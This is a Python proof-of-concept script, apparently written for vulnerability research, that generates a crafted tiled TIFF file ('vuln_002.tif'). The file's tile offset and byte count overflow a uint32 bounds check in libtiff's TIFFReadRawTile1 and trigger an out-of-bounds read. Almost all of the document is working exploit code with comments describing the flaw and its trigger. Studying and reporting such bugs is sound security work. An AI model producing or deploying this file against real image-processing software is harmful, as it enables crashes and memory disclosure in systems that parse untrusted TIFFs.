#!/usr/bin/env python3
"""
VULN 002: TIFFReadRawTile1 mmap bounds-check uint32 overflow → OOB read

Craft a tiled TIFF where:
  TileOffsets[0]   = 0xFFFFFF00
  TileByteCounts[0] = 256
  Sum = 0xFFFFFF00 + 256 = 0x100000000 — overflows uint32 to 0

The check in TIFFReadRawTile1 (tif_read.c:~449):
  if (offset + size > tif->tif_size)  <-- all uint32 arithmetic
becomes 0 > ~178  which is False, so it passes.
Then _TIFFmemcpy reads from tif_base + 0xFFFFFF00 → OOB read / SEGV.
"""

import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.tif")

def pack_ifd_entry(tag, typ, count, value):
    """Pack a 12-byte IFD entry. value is already a 4-byte LE integer."""
    return struct.pack("<HHII", tag, typ, count, value)

SHORT = 3
LONG  = 4

# --- Compute layout offsets ---
HEADER_SIZE  = 8        # 4 magic + 2 version + 2 (actually 4 IFD offset = 8 bytes total)
IFD_OFFSET   = 8        # IFD immediately after header
NUM_ENTRIES  = 13
IFD_SIZE     = 2 + NUM_ENTRIES * 12 + 4   # count(2) + entries + next_ifd(4)
# Rational data placed right after IFD
XRES_OFFSET  = IFD_OFFSET + IFD_SIZE       # 8 bytes
YRES_OFFSET  = XRES_OFFSET + 8             # 8 bytes
TOTAL_SIZE   = YRES_OFFSET + 8

# --- Build IFD entries (must be sorted by tag number) ---
entries = []
# 0x0100 ImageWidth  = 16 (LONG)
entries.append(pack_ifd_entry(0x0100, LONG,  1, 16))
# 0x0101 ImageLength = 16 (LONG)
entries.append(pack_ifd_entry(0x0101, LONG,  1, 16))
# 0x0102 BitsPerSample = 8 (SHORT, stored inline padded to 4 bytes)
entries.append(pack_ifd_entry(0x0102, SHORT, 1, 8))
# 0x0103 Compression = 1 (no compression) (SHORT)
entries.append(pack_ifd_entry(0x0103, SHORT, 1, 1))
# 0x0106 PhotometricInterp = 1 (BlackIsZero) (SHORT)
entries.append(pack_ifd_entry(0x0106, SHORT, 1, 1))
# 0x0115 SamplesPerPixel = 1 (SHORT)
entries.append(pack_ifd_entry(0x0115, SHORT, 1, 1))
# 0x011A XResolution = rational offset
entries.append(pack_ifd_entry(0x011A, 5,     1, XRES_OFFSET))
# 0x011B YResolution = rational offset
entries.append(pack_ifd_entry(0x011B, 5,     1, YRES_OFFSET))
# 0x0128 ResolutionUnit = 2 (inch) (SHORT)
entries.append(pack_ifd_entry(0x0128, SHORT, 1, 2))
# 0x0142 TileWidth = 16 (LONG)
entries.append(pack_ifd_entry(0x0142, LONG,  1, 16))
# 0x0143 TileLength = 16 (LONG)
entries.append(pack_ifd_entry(0x0143, LONG,  1, 16))
# 0x0144 TileOffsets = 0xFFFFFF00 (LONG, count=1, stored inline)
entries.append(pack_ifd_entry(0x0144, LONG,  1, 0xFFFFFF00))
# 0x0145 TileByteCounts = 256 (LONG, count=1, stored inline)
entries.append(pack_ifd_entry(0x0145, LONG,  1, 256))

assert len(entries) == NUM_ENTRIES, f"Expected {NUM_ENTRIES} entries, got {len(entries)}"

# --- Assemble file ---
# Little-endian TIFF header
header = b'\x49\x49'            # byte order: little-endian
header += struct.pack("<H", 42) # TIFF magic
header += struct.pack("<I", IFD_OFFSET)  # offset to first IFD

ifd  = struct.pack("<H", NUM_ENTRIES)
ifd += b''.join(entries)
ifd += struct.pack("<I", 0)    # next IFD = none

# Rational values: numerator=72, denominator=1 (72 DPI)
xres = struct.pack("<II", 72, 1)
yres = struct.pack("<II", 72, 1)

data = header + ifd + xres + yres

assert len(data) == TOTAL_SIZE, f"Size mismatch: got {len(data)}, expected {TOTAL_SIZE}"

with open(OUT, "wb") as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT}")
print(f"    TileOffsets[0]    = 0xFFFFFF00 ({0xFFFFFF00})")
print(f"    TileByteCounts[0] = 256")
print(f"    uint32 sum        = {(0xFFFFFF00 + 256) & 0xFFFFFFFF} (overflows to 0)")
print(f"    tif_size          ≈ {TOTAL_SIZE} bytes")
print(f"    Bounds check:  0 > {TOTAL_SIZE}  → False  → proceeds to OOB read")
